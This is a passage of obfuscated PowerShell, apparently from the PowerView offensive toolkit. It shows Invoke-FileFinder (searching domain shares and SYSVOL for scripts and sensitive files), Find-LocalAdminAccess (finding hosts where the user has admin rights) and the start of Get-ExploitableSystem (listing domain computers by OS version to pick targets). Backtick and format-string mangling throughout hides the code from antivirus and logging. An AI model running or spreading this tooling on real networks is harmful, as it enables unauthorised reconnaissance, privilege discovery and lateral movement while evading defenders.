                &("{0}{2}{1}{3}"-f 'Wri','V','te-',("{0}{1}{2}"-f'erbo','s','e')) "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))  "
                &("{3}{1}{0}{2}"-f 'ma',("{1}{0}"-f'm','oke-Co'),'nd','Inv') -ScriptBlock ${H`oSt`ENUMbloCk} -ArgumentList ${COm`pu`Ter}, ${fA`lSE}, ${C`Heck`SHaR`EacC`EsS}, ${ex`C`L`UdedSH`ARes}, ${C`hE`cKAdMin}
            }
        }
        
    }
}


function i`Nvo`Ke-fiL`eF`iNder {


    [CmdletBinding()]
    param(
        [Parameter(POsITIon=0,ValUEFRompipELiNe=${t`RuE})]
        [Alias({"{0}{1}"-f'Hos','ts'})]
        [String[]]
        ${com`Pu`TERnAme},

        [ValidateScript({&("{2}{1}{0}"-f'h',("{0}{1}" -f'-P','at'),("{1}{0}" -f'est','T')) -Path ${_} })]
        [Alias({"{0}{1}{2}"-f 'H','os',{"{1}{0}" -f't','tLis'}})]
        [String]
        ${Co`MP`UtER`File},

        [String]
        ${CoMPUT`eR`FILTer},

        [String]
        ${c`Omp`UtE`RaD`spaTh},

        [ValidateScript({&("{1}{2}{0}{3}"-f 'P','Te','st-','ath') -Path ${_} })]
        [String]
        ${s`HAR`elIst},

        [Switch]
        ${o`FfICeDo`Cs},

        [Switch]
        ${F`RE`S`HeXES},

        [String[]]
        ${TE`R`Ms},

        [ValidateScript({&("{2}{1}{0}" -f 'ath','-P',("{1}{0}" -f 't','Tes')) -Path ${_} })]
        [String]
        ${teR`m`l`ist},

        [String]
        ${Las`TAcCESsT`iME},

        [String]
        ${lAS`TWriTe`TImE},

        [String]
        ${cReATIoN`TI`me},

        [Switch]
        ${i`NCL`UdEc},

        [Switch]
        ${InC`LU`deadMIN},

        [Switch]
        ${Ex`cl`UDEF`olDeRs},

        [Switch]
        ${EXcL`Ude`Hi`DD`EN},

        [Switch]
        ${C`HEc`kwRI`T`eaCceSs},

        [String]
        ${o`UtFiLE},

        [Switch]
        ${N`Oclo`B`BeR},

        [Switch]
        ${n`oP`iNg},

        [UInt32]
        ${deL`Ay} = 0,

        [Double]
        ${Ji`TT`Er} = .3,

        [String]
        ${do`M`AIN},

        [String]
        ${dOMAI`N`C`On`Tr`oLlER},
        
        [Switch]
        ${sear`Ch`FOrest},

        [Switch]
        ${sE`ArCHs`ysVol},

        [ValidateRange(1,100)] 
        [Int]
        ${tHr`eA`Ds},

        [Switch]
        ${u`s`epSD`RIve},

        [System.Management.Automation.PSCredential]
        ${CR`EdE`Nti`AL} =   ${T`65Pi}::"e`mPTY"
    )

    begin {
        if (${P`S`Bo`UnDPARaMeTERS}[("{0}{1}"-f'De','bug')]) {
            ${DeBU`G`prEFeren`Ce} = ("{2}{1}{0}"-f'ue','n',("{0}{1}" -f 'C','onti'))
        }

        
        ${rAND`NO} = &("{0}{2}{1}"-f("{0}{1}" -f 'New','-'),("{0}{1}"-f'bje','ct'),'O') ("{2}{1}{3}{0}" -f ("{0}{2}{1}" -f 'm','ndom','.Ra'),'s','Sy','te')

        &("{3}{1}{2}{0}" -f 'se','it',("{2}{1}{0}"-f'o','Verb','e-'),'Wr') ('[*]'+' '+'R'+("{0}{1}" -f 'u','nning')+' '+("{0}{1}"-f 'Inv','oke-F')+'ile'+'F'+("{1}{0}{2}"-f 'd','in','er ')+'wi'+'th '+'d'+("{0}{1}"-f'ela','y')+' '+'o'+'f '+"$Delay")

        ${Sh`AReS} = @()

        
        [String[]] ${ex`CLU`dE`DshAr`ES} = @("C$", "ADMIN$")

        
        if (${In`C`LUdec}) {
            if (${in`CLuD`EaDmiN}) {
                ${exCl`UdE`DSHA`ReS} = @()
            }
            else {
                ${exclUDe`dSha`R`eS} = @("ADMIN$")
            }
        }

        if (${iNclu`d`eaDMIn}) {
            if (${inc`L`Udec}) {
                ${exCl`U`D`edSH`ArEs} = @()
            }
            else {
                ${e`Xc`lu`D`edShares} = @("C$")
            }
        }

        
        if(!${n`Oc`LoBB`Er}) {
            if (${o`UtfI`lE} -and (&("{0}{2}{1}" -f("{1}{0}"-f 'st','Te'),'h',("{0}{1}" -f'-Pa','t')) -Path ${oUT`Fi`lE})) { &("{2}{1}{0}"-f 'em','It',("{0}{1}" -f 'Remo','ve-')) -Path ${Out`Fi`le} }
        }

        
        if (${Te`RMLi`St}) {
            ForEach (${tE`Rm} in &("{1}{0}{2}{3}"-f'o',("{1}{0}" -f't-C','Ge'),'nte','nt') -Path ${TE`RMli`st}) {
                if ((${T`ErM} -ne ${N`Ull}) -and (${Te`Rm}.("{0}{1}" -f't','rim')."i`Nvo`kE"() -ne '')) {
                    ${ter`mS} += ${tE`Rm}
                }
            }
        }

        
        if(${SH`Ar`eLiSt}) {
            ForEach (${i`TEM} in &("{2}{0}{1}" -f ("{1}{0}" -f'nte','o'),'nt',("{0}{1}"-f'Get-','C')) -Path ${shAR`El`iSt}) {
                if ((${iT`Em} -ne ${n`Ull}) -and (${It`EM}.("{1}{0}" -f 'm','tri')."invo`KE"() -ne '')) {
                    
                    ${SH`ArE} = ${It`em}.("{0}{1}" -f'Sp','lit')."InVO`Ke"("`t")[0]
                    ${S`h`AREs} += ${shA`Re}
                }
            }
        }
        else {
            
            if(${co`mPu`TErFi`Le}) {
                ${coMpu`Ter`Na`me} = &("{0}{1}{2}" -f'Get',("{0}{1}"-f '-Co','nt'),'ent') -Path ${CO`Mpu`T`E`RFIlE}
            }

            if(!${c`o`mP`U`TeRnaME}) {

                if(${D`OMaIn}) {
                    ${t`Ar`g`etDomAINS} = @(${D`oMAIN})
                }
                elseif(${S`EARChFoR`E`sT}) {
                    
                    ${tAR`Ge`TDo`Ma`inS} = &("{2}{1}{4}{3}{5}{0}" -f("{2}{1}{0}" -f 'ain','om','stD'),'N',("{0}{1}"-f'G','et-'),'Fo','et','re') | &("{1}{0}{3}{2}"-f 'Eac','For','t',("{1}{0}" -f'jec','h-Ob')) { ${_}."n`Ame" }
                }
                else {
                    
                    ${TA`Rg`etDOMainS} = @( (&("{2}{1}{4}{3}{0}"-f 'n','et',("{1}{0}"-f'N','Get-'),'mai','Do'))."Na`mE" )
                }

                if(${SEA`RcHsy`SVol}) {
                    ForEach (${D`oMaIn} in ${ta`RGe`TdOMai`NS}) {
                        ${dc`SE`ArChpa`TH} = "\\$Domain\SYSVOL\"
                        &("{0}{2}{1}{3}" -f ("{0}{1}"-f 'Writ','e-V'),'b','er','ose') ('[*'+'] '+'A'+("{2}{1}{0}"-f'ng ','i','dd')+("{0}{1}" -f 'sh','ar')+'e '+("{1}{2}{0}" -f 'h','se','arc')+' '+("{0}{1}"-f'p','ath')+' '+"$DCSearchPath")
                        ${ShaR`Es} += ${D`CsEARc`h`PAth}
                    }
                    if(!${T`eR`mS}) {
                        
                        ${t`E`Rms} = @(("{1}{0}"-f 's','.vb'), ("{1}{0}" -f't','.ba'), ("{0}{1}"-f'.ps','1'))
                    }
                }
                else {
                    [array]${c`OMPutE`R`NaME} = @()

                    ForEach (${d`Om`Ain} in ${TA`R`gE`TDOMaINs}) {
                        &("{0}{2}{3}{1}"-f 'Wr',("{1}{0}"-f 'bose','r'),'ite','-Ve') ('['+'*] '+("{0}{1}"-f 'Quer','y')+'ing'+' '+'do'+("{1}{0}" -f'in','ma')+' '+("$Domain "+'')+'for'+' '+("{1}{0}" -f 'st','ho')+'s')
                        ${coMP`UteRN`AME} += &("{1}{0}{2}{3}{4}"-f'Net',("{0}{1}" -f'Get','-'),'Co','mpu','ter') -Filter ${CompU`T`ErFi`lTEr} -ADSpath ${cOmpU`TEraD`s`PaTH} -Domain ${dO`M`AIN} -DomainController ${D`oMAi`N`C`oNtroLLEr}
                    }

                    
                    ${CoM`P`U`T`erName} = ${C`OmP`UTE`RnaME} | &("{1}{2}{0}{3}"-f '-O','W',("{1}{0}" -f 're','he'),("{0}{1}" -f'b','ject')) { ${_} } | &("{2}{1}{0}" -f("{1}{0}" -f 't','jec'),("{0}{1}"-f 't-O','b'),'Sor') -Unique | &("{3}{0}{1}{2}"-f'rt-','O',("{0}{1}"-f 'bje','ct'),'So') { &("{0}{2}{1}"-f 'Ge',("{1}{0}"-f'm','ndo'),("{0}{1}"-f't-','Ra')) }
                    if($(${C`Ompu`T`E`RNAmE}."CoU`NT") -eq 0) {
                        throw ("{1}{0}{4}{3}{2}" -f ' ','No',("{0}{1}" -f 'oun','d!'),'f',("{0}{1}"-f 'h','osts '))
                    }
                }
            }
        }

        
        ${hoSTEN`UM`BLOck} = {
            param(${cOMp`U`T`e`RnaMe}, ${pI`Ng}, ${E`xClU`dEDSha`Res}, ${T`E`RMs}, ${e`xclude`FO`lDers}, ${O`F`FI`CedocS}, ${EXC`ludEHI`dDEN}, ${fR`EShE`xEs}, ${CHeCkW`RIT`ea`Cc`ess}, ${ou`TfIle}, ${usEp`s`DR`IvE}, ${c`R`eDe`NTiaL})

            &("{0}{1}{2}{3}" -f ("{0}{3}{2}{1}" -f 'Writ','erb','-V','e'),'o','s','e') ('Com'+'pu'+("{2}{0}{1}" -f 'N','ame: ','ter')+"$ComputerName")
            &("{2}{1}{3}{0}" -f 'ose','te-','Wri',("{0}{1}"-f 'Ve','rb')) ('E'+("{0}{2}{1}"-f'xclu','e','d')+("{0}{1}" -f 'd','Sha')+'r'+("{1}{0}" -f's: ','e')+"$ExcludedShares")
            ${s`EarcHsHA`REs} = @()

            if(${c`O`mpuTErn`Ame}.("{0}{2}{1}" -f("{0}{2}{1}"-f'S','tsW','tar'),'h','it')."Inv`o`KE"("\\")) {
                
                ${SE`Arch`s`hARes} += ${co`mP`UTerNamE}
            }
            else {
                
                ${u`P} = ${t`RUE}
                if(${Pi`NG}) {
                    ${U`p} = &("{1}{0}{4}{2}{3}"-f't-C','Tes','ti','on',("{1}{0}" -f'nec','on')) -Count 1 -Quiet -ComputerName ${c`Om`PU`Te`RNaMe}
                }
                if(${Up}) {
                    
                    ${shar`ES} = &("{2}{1}{0}{3}"-f ("{2}{1}{0}"-f 'a','tSh','Ne'),'et-','G','re') -ComputerName ${COMpU`TeR`Na`me}
                    ForEach (${SH`Are} in ${S`h`AREs}) {

                        ${n`Et`NAmE} = ${s`h`ArE}."shi1`_nEt`Na`mE"
                        ${P`Ath} = '\\'+${C`oM`pU`T`eRNAmE}+'\'+${N`e`TnAMe}

                        
                        if ((${nET`NaMe}) -and (${NE`TNa`ME}.("{1}{0}" -f'im','tr')."in`VoKE"() -ne '')) {

                            
                            if (${eX`CLu`ded`shaReS} -NotContains ${NetN`A`mE}.("{1}{2}{0}"-f'r',("{0}{1}" -f 'ToUp','p'),'e')."IN`VOke"()) {
                                
                                try {
                                    ${nU`ll} =  (  &("{2}{1}{0}"-f'ble','ria','Va') ('cr'+'gP0') )."vAl`UE"::("{2}{1}{0}"-f("{1}{0}"-f'les','i'),'tF','Ge')."iN`VOkE"(${Pa`TH})
                                    ${sE`ArcHsh`Ares} += ${P`ATh}
                                }
                                catch {
                                    &("{0}{1}{2}"-f ("{1}{0}"-f'rit','W'),("{0}{1}" -f 'e-De','b'),'ug') ('[!'+'] '+'No'+' '+'a'+("{2}{0}{1}"-f 'e','ss ','cc')+'t'+'o '+"$Path")
                                }
                            }
                        }
                    }
                }
            }

            ForEach(${SHA`Re} in ${SearcHS`HAR`es}) {
                ${S`EaRcH`ARgS} =  @{
                    ("{0}{1}"-f 'P','ath') = ${S`h`ARe}
                    ("{1}{0}" -f 'rms','Te') = ${te`RMS}
                    ("{0}{2}{3}{1}"-f 'Off','cs','i',("{1}{0}"-f 'eDo','c')) = ${oF`F`Ic`EdoCS}
                    ("{2}{1}{0}" -f 's',("{1}{0}" -f 'eshEXE','r'),'F') = ${fRes`H`EXES}
                    ("{0}{2}{3}{1}{4}" -f'La','ce','st','Ac',("{0}{1}"-f's','sTime')) = ${LaStA`C`Ces`sTi`Me}
                    ("{1}{0}{3}{2}" -f ("{0}{1}" -f 'a','stWr'),'L',("{1}{0}" -f 'me','Ti'),'ite') = ${l`ASTWri`T`ET`Ime}
                    ("{1}{0}{2}"-f("{0}{1}"-f 'rea','ti'),'C',("{0}{1}" -f'onTi','me')) = ${cRe`A`TI`ontime}
                    ("{4}{2}{0}{3}{1}" -f 'Fol','s','ude','der',("{0}{1}"-f 'E','xcl')) = ${ExCL`UDE`FOLd`ERS}
                    ("{2}{0}{3}{1}"-f 'clu',("{1}{0}" -f 'dden','Hi'),'Ex','de') = ${E`xC`lU`DEHiDdeN}
                    ("{0}{1}{2}{3}"-f ("{0}{2}{1}"-f 'Che','Wri','ck'),'teA',("{1}{0}" -f's','cce'),'s') = ${c`HE`Ckw`Rit`eACcE`Ss}
                    ("{0}{2}{1}" -f'O','e',("{1}{0}" -f 'l','utFi')) = ${o`UtFiLe}
                    ("{1}{2}{0}" -f("{0}{1}"-f'ri','ve'),'Use','PSD') = ${Use`pS`DrivE}
                    ("{1}{0}{2}" -f ("{0}{2}{1}" -f 'e','ti','den'),'Cr','al') = ${Cr`Eden`TIAL}
                }

                &("{0}{4}{6}{5}{1}{3}{2}"-f 'F',("{0}{1}"-f 'e','res'),'ile',("{0}{1}"-f't','ingF'),'in','Int','d-') @SearchArgs
            }
        }
    }

    process {

        if(${thR`e`ADs}) {
            &("{0}{2}{1}{3}{4}" -f'W','e','rit','-Ve',("{1}{0}" -f'e','rbos')) (("{1}{0}"-f 'ng','Usi')+' '+'thr'+("{1}{0}" -f 'din','ea')+'g'+' '+'wi'+'th '+'th'+("{2}{0}{1}"-f'e','ads ','r')+'= '+"$Threads")

            
            ${sc`R`iPTPaRams} = @{
                ("{1}{0}"-f 'ng','Pi') = $(-not ${NOpi`Ng})
                ("{1}{3}{2}{0}" -f'res','Exc',("{0}{1}"-f 'edS','ha'),'lud') = ${e`X`C`LudEdS`HARes}
                ("{1}{0}" -f ("{1}{0}"-f 's','erm'),'T') = ${t`Er`Ms}
                ("{0}{2}{3}{1}"-f 'Ex','ers',("{0}{1}"-f'cl','ud'),("{0}{1}"-f'eFo','ld')) = ${exclU`deFOl`d`e`RS}
                ("{1}{2}{0}" -f 's','Off',("{1}{0}"-f 'c','iceDo')) = ${O`Ffic`ed`oCS}
                ("{3}{1}{2}{0}{4}" -f 'e',("{0}{1}"-f'udeH','id'),'d',("{0}{1}" -f 'E','xcl'),'n') = ${ExC`L`Ud`eh`idDEN}
                ("{0}{2}{1}" -f("{1}{0}"-f 'eshE','Fr'),'s','XE') = ${FRe`ShE`xES}
                ("{0}{1}{2}{3}" -f ("{0}{1}" -f 'C','hec'),("{0}{1}"-f 'k','Wri'),'te',("{1}{0}" -f's','Acces')) = ${chE`cKWrITe`A`Cce`sS}
                ("{0}{1}{2}"-f'O',("{0}{1}"-f'ut','Fi'),'le') = ${oU`TFiLE}
                ("{2}{0}{1}"-f'PSD',("{1}{0}" -f've','ri'),'Use') = ${US`e`PsdRiVe}
                ("{2}{1}{0}" -f'ial',("{1}{0}" -f 't','eden'),'Cr') = ${c`Re`den`Tial}
            }

            
            if(${sha`R`Es}) {
                
                &("{0}{4}{3}{1}{2}" -f("{0}{1}{2}"-f 'I','nvok','e-Thr'),'n',("{0}{1}" -f 'ctio','n'),("{1}{0}"-f 'u','dedF'),'ea') -ComputerName ${ShAR`es} -ScriptBlock ${h`oST`ENU`mbLOcK} -ScriptParameters ${ScRIpT`PA`R`Ams}
            }
            else {
                &("{4}{1}{0}{5}{2}{3}" -f '-','oke',("{1}{0}"-f'nct','Fu'),'ion','Inv',("{1}{0}{2}" -f 'e','Thread','d')) -ComputerName ${COmP`Ut`er`NA`me} -ScriptBlock ${Ho`sT`eNuM`BlOcK} -ScriptParameters ${sc`RiPt`par`AmS}
            }        
        }

        else {
            if(${sHar`eS}){
                ${co`mP`UTER`N`AMe} = ${S`HARES}
            }
            elseif(-not ${nop`INg} -and (${CoM`PuT`eRnAMe}."CO`UnT" -gt 1)) {
                
                ${pi`Ng} = {param(${Co`mpU`TeRNAme}) if(&("{4}{2}{0}{3}{1}"-f("{1}{0}" -f 'onn','-C'),("{1}{0}"-f'ion','t'),'est','ec','T') -ComputerName ${c`omPuTern`A`ME} -Count 1 -Quiet -ErrorAction ("{0}{1}"-f 'Sto','p')){${c`oMpUtER`NAmE}}}
                ${cOmPu`T`eRNA`mE} = &("{4}{5}{3}{2}{1}{0}" -f'on','ti',("{0}{1}" -f'dF','unc'),("{2}{0}{3}{1}"-f'e','hreade','vok','-T'),'I','n') -NoImports -ComputerName ${c`OMpu`TeR`N`AMe} -ScriptBlock ${p`iNg} -Threads 100
            }

            &("{0}{2}{1}{3}" -f ("{0}{2}{1}"-f'Write-','e','V'),'bos','r','e') "[*] Total number of active hosts: $($ComputerName.count)  "
            ${C`oU`NTEr} = 0

            ${CO`m`pu`TeRN`AmE} | &("{2}{3}{1}{0}" -f 'ct',("{1}{0}" -f 'e','-Obj'),'Whe','re') {${_}} | &("{1}{0}{4}{2}{3}" -f("{1}{0}" -f 'ach','rE'),'Fo','bje','ct','-O') {
                &("{3}{1}{2}{0}"-f'se',("{0}{1}"-f'te','-Ve'),'rbo','Wri') ('C'+'o'+("{0}{1}{2}" -f'mp','uter:',' ')+"$_")
                ${C`oUn`TeR} = ${CO`U`Nter} + 1

                
                &("{3}{0}{2}{1}" -f("{1}{0}"-f't-S','r'),'eep','l','Sta') -Seconds ${R`A`Ndno}.("{0}{1}"-f'Ne','xt')."iN`Voke"((1-${jIT`TeR})*${de`lAY}, (1+${jitt`ER})*${d`E`lAY})

                &("{1}{2}{0}{3}" -f'ite','W','r',("{1}{2}{0}"-f'se','-Ve','rbo')) "[*] Enumerating server $_ ($Counter of $($ComputerName.count))  "

                &("{3}{0}{2}{1}" -f("{0}{1}"-f 'k','e-C'),'and','omm',("{1}{0}"-f'o','Inv')) -ScriptBlock ${HO`S`T`ENumbL`OcK} -ArgumentList ${_}, ${FA`Lse}, ${eX`cLU`dedShAR`ES}, ${Te`RmS}, ${ExClUd`e`FoLd`ers}, ${O`F`FIced`OCS}, ${Exclu`dE`HI`ddEn}, ${freS`He`X`es}, ${c`hec`K`W`RitEAccEss}, ${Out`FiLe}, ${uSe`PSDR`IvE}, ${crEDE`NTi`Al}                
            }
        }
    }
}


function f`IND`-`l`OCa`lADm`I`NaC`cESS {


    [CmdletBinding()]
    param(
        [Parameter(POsItIoN=0,ValUeFRomPiPelINe=${T`RUe})]
        [Alias({"{0}{1}"-f("{0}{1}"-f 'Ho','st'),'s'})]
        [String[]]
        ${cO`mpU`TE`RnaME},

        [ValidateScript({&("{2}{1}{0}" -f'h','at',("{0}{1}"-f'Test','-P')) -Path ${_} })]
        [Alias({"{1}{2}{0}"-f ("{1}{0}"-f 'ist','tL'),'H','os'})]
        [String]
        ${c`omPUte`Rfi`le},

        [String]
        ${COmPu`TeRfI`LT`eR},

        [String]
        ${cO`m`P`UTeRADSP`ATh},

        [Switch]
        ${noPi`Ng},

        [UInt32]
        ${DeL`Ay} = 0,

        [Double]
        ${J`i`TtER} = .3,

        [String]
        ${DO`MAiN},

        [String]
        ${do`Ma`IN`cOntRo`l`leR},

        [Switch]
        ${SeA`R`cHFOrESt},

        [ValidateRange(1,100)] 
        [Int]
        ${tH`ReaDs}
    )

    begin {
        if (${pS`B`OU`N`DpaRaMETE`Rs}[("{1}{0}" -f ("{0}{1}" -f 'e','bug'),'D')]) {
            ${DEbUgp`ReF`er`en`ce} = ("{1}{2}{0}"-f ("{1}{0}" -f'nue','ti'),'C','on')
        }

        
        ${ran`d`No} = &("{2}{1}{0}" -f 'ect',("{0}{1}" -f'e','w-Obj'),'N') ("{2}{3}{4}{1}{0}" -f 'm',("{0}{1}"-f'an','do'),'Sy','ste','m.R')

        &("{4}{0}{2}{1}{3}"-f 'Ve','b','r','ose',("{1}{2}{0}"-f'te-','Wr','i')) ('[*'+'] '+("{1}{0}" -f 'nn','Ru')+'i'+'ng '+'Fi'+'n'+("{0}{2}{1}"-f'd-','alAdmi','Loc')+'nAc'+'c'+("{0}{1}"-f 'es','s ')+'w'+("{0}{1}"-f'it','h ')+'d'+'e'+("{1}{0}" -f ' ','lay')+'of'+' '+"$Delay")

        
        if(${CO`m`p`UterfIle}) {
            ${COmpUT`e`R`NAME} = &("{0}{1}{3}{2}" -f 'G','et',("{0}{1}"-f 'nten','t'),'-Co') -Path ${Co`mP`UtER`F`Ile}
        }

        if(!${CompU`TE`RnamE}) {
            [array]${CoMPUTeR`N`AMe} = @()

            if(${D`O`MAin}) {
                ${T`ArgEtd`o`MAInS} = @(${doM`AiN})
            }
            elseif(${seAr`c`HfOREST}) {
                
                ${TA`R`g`Etdom`AINs} = &("{2}{4}{0}{1}{5}{3}" -f ("{1}{0}" -f 're','tFo'),'stD',("{1}{0}"-f't-','Ge'),'n','Ne',("{1}{0}" -f 'mai','o')) | &("{2}{0}{4}{3}{1}"-f 'E','t','For','jec',("{0}{1}" -f 'a','ch-Ob')) { ${_}."Na`Me" }
            }
            else {
                
                ${Tar`ge`TdoMA`iNS} = @( (&("{2}{0}{1}" -f ("{1}{0}"-f'a','Dom'),'in',("{1}{0}{2}"-f't-','Ge','Net')))."N`AME" )
            }

            ForEach (${Do`mA`In} in ${Ta`R`get`Do`mAIns}) {
                &("{1}{0}{3}{2}" -f ("{1}{0}"-f 'e','rit'),'W',("{1}{0}"-f'e','Verbos'),'-') ('['+'*] '+'Q'+("{1}{0}" -f'ng','ueryi')+' '+("{0}{1}" -f 'do','ma')+'i'+'n '+("$Domain "+'')+'for'+' '+'h'+("{1}{0}" -f's','ost'))
                ${C`OMpUT`erName} += &("{3}{1}{0}{2}" -f("{0}{1}"-f'etC','ompu'),("{0}{1}" -f 'et','-N'),'ter','G') -Filter ${Com`PuT`ERFI`lT`eR} -ADSpath ${Co`m`PUTer`AdsPAtH} -Domain ${Do`m`Ain} -DomainController ${DO`MaiN`cOntRoL`ler}
            }
        
            
            ${Comp`UTe`RN`AME} = ${Co`mpuT`E`RnA`me} | &("{0}{2}{1}" -f'Whe','ct',("{1}{0}{2}" -f 'e-O','r','bje')) { ${_} } | &("{0}{2}{1}{3}"-f 'So','e',("{0}{1}" -f'rt','-Obj'),'ct') -Unique | &("{1}{2}{0}" -f 'ect',("{0}{1}{2}"-f'S','ort-O','b'),'j') { &("{3}{2}{0}{1}"-f 'o','m',("{1}{0}"-f'nd','-Ra'),'Get') }
            if($(${cOmpu`T`ERNa`ME}."co`UNT") -eq 0) {
                throw ("{1}{3}{2}{0}" -f ("{1}{0}" -f 'd!','oun'),'N','f',("{0}{1}{2}"-f 'o h','ost','s '))
            }
        }

        
        ${h`OSTEn`U`MbLOck} = {
            param(${C`Om`putEr`Na`mE}, ${pi`Ng})

            ${u`p} = ${T`Rue}
            if(${p`ing}) {
                ${uP} = &("{2}{1}{0}{4}{3}"-f 'Con','-',("{1}{0}"-f 't','Tes'),("{1}{0}"-f 'ion','ct'),'ne') -Count 1 -Quiet -ComputerName ${co`mpUtErn`A`me}
            }
            if(${Up}) {
                
                ${Acc`ESs} = &("{5}{1}{0}{7}{2}{4}{6}{3}"-f("{1}{0}" -f 'Chec','e-'),("{1}{0}" -f 'vok','n'),("{0}{1}"-f 'L','oca'),'ss',("{2}{0}{1}" -f'd','min','lA'),'I',("{0}{1}" -f'A','cce'),'k') -ComputerName ${CO`mP`U`TERnAmE}
                if (${A`cCE`sS}) {
                    ${comP`UTER`NAmE}
                }
            }
        }

    }

    process {

        if(${Threa`Ds}) {
            &("{2}{1}{3}{0}" -f("{0}{1}"-f 'V','erbose'),'e',("{1}{0}"-f'it','Wr'),'-') ('Us'+'in'+'g '+'t'+("{1}{0}"-f'd','hrea')+("{1}{0}" -f ' ','ing')+("{1}{0}" -f 'h','wit')+' '+("{1}{0}"-f'e','thr')+'ads'+' '+'= '+"$Threads")

            
            ${scri`pt`PARA`ms} = @{
                ("{1}{0}" -f'ng','Pi') = $(-not ${NoP`Ing})
            }

            
            &("{3}{1}{2}{0}{4}{5}" -f 'edF','ok',("{1}{0}{2}"-f'Thre','e-','ad'),'Inv',("{1}{0}" -f'ti','unc'),'on') -ComputerName ${comp`U`TeRna`me} -ScriptBlock ${Ho`St`ENuMblO`CK} -ScriptParameters ${S`CrIPTp`Ara`MS}
        }

        else {
            if(-not ${N`O`pIng} -and (${cOMP`Ute`RN`AME}."cou`Nt" -ne 1)) {
                
                ${PI`NG} = {param(${CoM`puTer`NAME}) if(&("{2}{0}{1}{3}" -f 'n',("{1}{0}" -f'cti','e'),("{1}{2}{0}" -f 'n','T','est-Co'),'on') -ComputerName ${c`OM`PU`TEr`NAME} -Count 1 -Quiet -ErrorAction ("{0}{1}" -f'St','op')){${C`O`m`p`UTERName}}}
                ${CompU`Ter`NaME} = &("{3}{1}{0}{4}{2}" -f'e-T','k',("{0}{1}"-f'ctio','n'),("{0}{1}"-f'Inv','o'),("{2}{0}{1}"-f'adedFu','n','hre')) -NoImports -ComputerName ${c`Ompu`T`ERNamE} -ScriptBlock ${p`inG} -Threads 100
            }

            &("{1}{2}{0}" -f("{2}{0}{1}"-f 'e','rbose','e-V'),'W','rit') "[*] Total number of active hosts: $($ComputerName.count)  "
            ${C`OuN`TEr} = 0

            ForEach (${com`Put`eR} in ${CoMp`UTE`R`NAmE}) {

                ${C`O`UNTeR} = ${c`Ou`NTeR} + 1

                
                &("{0}{3}{2}{1}"-f 'Sta','p',("{1}{0}"-f'e','-Sle'),'rt') -Seconds ${raND`No}.("{0}{1}" -f'Ne','xt')."IN`VO`KE"((1-${J`ItT`ER})*${DeL`Ay}, (1+${Ji`T`TER})*${dEL`Ay})

                &("{0}{3}{4}{1}{2}" -f 'Wri','er',("{1}{0}" -f 'e','bos'),'te','-V') "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))  "
                &("{1}{2}{3}{0}"-f("{0}{2}{1}" -f 'Com','nd','ma'),'Inv','o','ke-') -ScriptBlock ${hOst`eN`UmB`l`ocK} -ArgumentList ${C`oMPU`T`er}, ${fA`L`sE}, ${o`UtfiLe}, ${Do`mai`NSid}, ${t`RusTgRoU`PSs`IDS}
            }
        }
    }
}


function GET-E`xPL`Oit`A`BlESystEm {

    [CmdletBinding()]
    Param(
        [Parameter(ValuEfroMpIpeLIne=${Tr`Ue})]
        [Alias({"{0}{2}{1}"-f'Ho','e',{"{0}{1}"-f 'stN','am'}})]
        [String]
        ${Co`mp`UtERNAme} = '*',

        [String]
        ${s`PN},

        [String]
        ${OpERA`Ti`NG`SyST`Em} = '*',

        [String]
        ${sErvIC`eP`Ack} = '*',

        [String]
        ${f`Il`TER},

        [Switch]
        ${pI`NG},

        [String]
        ${doMa`iN},

        [String]
        ${dO`maINCo`NTr`oLLEr},

        [String]
        ${Ad`SpA`Th},

        [Switch]
        ${U`NCOnSTRa`InEd},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`GEs`IZe} = 200
    )

    &("{3}{2}{1}{0}" -f 'se','rbo','-Ve',("{1}{0}" -f 'e','Writ')) ("{8}{11}{2}{12}{1}{0}{9}{7}{5}{13}{10}{4}{3}{6}" -f 'te',("{1}{0}" -f 'pu','om'),'a','or',("{1}{0}{2}"-f 'ec','Dir','t'),("{1}{0}"-f't','om Ac'),("{0}{1}" -f 'y..','.'),("{1}{3}{0}{2}" -f's ',' ac','fr','count'),'[*]','r',' ',' Gr',("{0}{1}{2}"-f'bb','ing',' c'),'ive')

    
    ${TA`BleADscO`mPut`ERS} = &("{0}{2}{1}" -f("{0}{1}" -f 'N','ew-'),'ect','Obj') ("{0}{2}{1}{4}{3}" -f'Sys','.D','tem',("{0}{1}"-f'Tab','le'),("{0}{2}{1}" -f'ata.','ta','Da')) 
    ${nU`LL} = ${TA`BL`EadSCOmpUt`eRS}."Co`lUM`Ns".("{1}{0}" -f'd','Ad')."iN`V`okE"(("{0}{1}{2}" -f 'Ho','st',("{0}{1}" -f 'na','me')))       
    ${NU`ll} = ${tABLe`A`D`scompUT`E`Rs}."col`UMNS".("{1}{0}" -f'd','Ad')."IN`V`OKE"(("{0}{2}{1}"-f 'O',("{0}{1}"-f'Sy','stem'),("{1}{0}" -f'ng','perati')))
    ${nu`Ll} = ${Ta`BLe`A`Ds`C`OMputers}."co`lum`NS".("{1}{0}" -f 'dd','A')."i`NVoKE"(("{0}{2}{1}" -f'Se',("{1}{0}"-f'ck','vicePa'),'r'))
    ${nU`Ll} = ${t`ABLEaDS`CO`mpUTERS}."Colu`m`Ns".("{0}{1}"-f 'A','dd')."inV`oke"(("{1}{2}{0}" -f ("{0}{2}{1}" -f 't','gon','Lo'),'L','as'))

    &("{1}{0}{4}{2}{3}" -f("{1}{0}"-f'Co','Net'),("{1}{0}"-f 'et-','G'),'e','r',("{0}{1}" -f 'm','put')) -FullData @PSBoundParameters | &("{2}{3}{1}{0}" -f't',("{0}{1}{2}" -f 'c','h-O','bjec'),'For','Ea') {

        ${CurRent`h`O`st} = ${_}."dN`SHoSTN`AMe"
        ${CU`R`REnT`Os} = ${_}."opE`R`A`Ti`NGSYStEm"
        ${cur`RE`NtSp} = ${_}."oP`erATiN`g`S`YsTEMserv`IC`e`paCk"
        ${C`U`RR`EnTlASt} = ${_}."lAs`TlO`GON"
        ${cur`Rentu`AC} = ${_}."u`s`ERAcCo`UntcO`N`TrOL"

        ${c`UrreNTUA`cBIN} =  (  &('ls') ("{0}{1}{2}"-f 'VaRIabLE:','l','cSg') )."va`luE"::("{2}{0}{1}" -f 'r','ing',("{1}{0}" -f't','ToS'))."i`NVOkE"(${_}."uS`e`RaccOUNTcONTR`OL",2)

        
        ${DI`s`AbLeoFF`sEt} = ${cuR`RE`NTuacb`in}."LENg`TH" - 2
